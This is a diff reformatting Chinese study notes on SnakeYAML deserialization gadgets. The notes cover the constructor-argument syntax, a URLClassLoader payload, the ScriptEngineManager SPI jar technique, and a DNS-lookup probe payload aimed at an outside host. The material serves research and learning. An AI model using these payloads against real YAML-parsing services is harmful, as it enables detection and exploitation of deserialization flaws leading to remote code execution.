@@ -9,16 +9,16 @@ description:
 https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90/#SnakeYaml%E7%AE%80%E4%BB%8B
 
 ## dump、load
- `Yaml.dump`, `Yaml.load` 对应序列化反序列化，把java对象变成yaml格式
+ `Yaml.dump`, `Yaml.load` 对应序列化反序列化，把 java 对象变成 yaml 格式
 
-对于非public属性，dump会调用对应的getter，load会调用对应setter
-public属性直接反射设置
+对于非 public 属性，dump 会调用对应的 getter，load 会调用对应 setter
+public 属性直接反射设置
 
-load时会反射调用类的无参构造函数，加载类时会触发static代码块
+load 时会反射调用类的无参构造函数，加载类时会触发 static 代码块
 
 ## 语法
 
-基础yaml语法：
+基础 yaml 语法：
 ```yaml
 none: null  
 bool: true  
@@ -58,7 +58,7 @@ password: testtest
 
 `[]` 指定初始化参数
 
-不止可以使用无参构造函数创建对象，也可以用`[]`指定参数
+不止可以使用无参构造函数创建对象，也可以用 `[]` 指定参数
 
 ```yaml
 !!java.net.URLClassLoader [[
@@ -66,7 +66,7 @@ password: testtest
 ]]
 ```
 
-会调用`URL(String.class)`方法创建URL对象，然后调用`URLClassLoader(URL[] urls)`创建URLClassLoader，外面一层`[`是指定参数，里面一层是表示列表
+会调用 `URL(String.class)` 方法创建 URL 对象，然后调用 `URLClassLoader(URL[] urls)` 创建 URLClassLoader，外面一层 `[` 是指定参数，里面一层是表示列表
 
 ## ScriptEngineManager SPI
 
@@ -78,9 +78,9 @@ password: testtest
 ]
 ```
 
-ScriptEngineManager在初始化时，会根据传入的classLoader去对应的jar中找`ScriptEngineFactory`的实现类。
+ScriptEngineManager 在初始化时，会根据传入的 classLoader 去对应的 jar 中找 `ScriptEngineFactory` 的实现类。
 
-这个SPI Jar结构如下，用mvn打包
+这个 SPI Jar 结构如下，用 mvn 打包
 ```txt
 src
 └── main
@@ -94,7 +94,7 @@ src
                 └── javax.script.ScriptEngineFactory
 ```
 
-javax.script.ScriptEngineFactory文件里面写`demo.MyScriptEngineFactory`
+javax.script.ScriptEngineFactory 文件里面写 `demo.MyScriptEngineFactory`
 
 ```txt
 at java.util.ServiceLoader$LazyClassPathLookupIterator.nextProviderClass(ServiceLoader.java:1206)
@@ -108,7 +108,7 @@ at javax.script.ScriptEngineManager.<init>(ScriptEngineManager.java:75)
 at Test.main(Test.java:14)
 ```
 
-parse中打开URL JAR，并获取services下的对应文件，获取其中的类名，然后用Class.forName加载类，这里initialize=false
+parse 中打开 URL JAR，并获取 services 下的对应文件，获取其中的类名，然后用 Class.forName 加载类，这里 initialize = false
 
 ![](assets/snakeyaml/Pasted%20image%2020260629152157.png)
 
@@ -129,12 +129,12 @@ JNDI
 ## 其他
 todo...
 
-spring、xbean、C3P0、commons-configuration的JNDI
+spring、xbean、C3P0、commons-configuration 的 JNDI
 
-C3P0二次反序列化
+C3P0 二次反序列化
 
 ## 漏洞探测
-URL作为键，生成hashMap，执行URL.equals，触发dns解析
+URL 作为键，生成 hashMap，执行 URL.equals，触发 dns 解析
 ```yaml
 !!java.net.URL ["http://hey.r.mekrina.tech/"]: 1
 ```
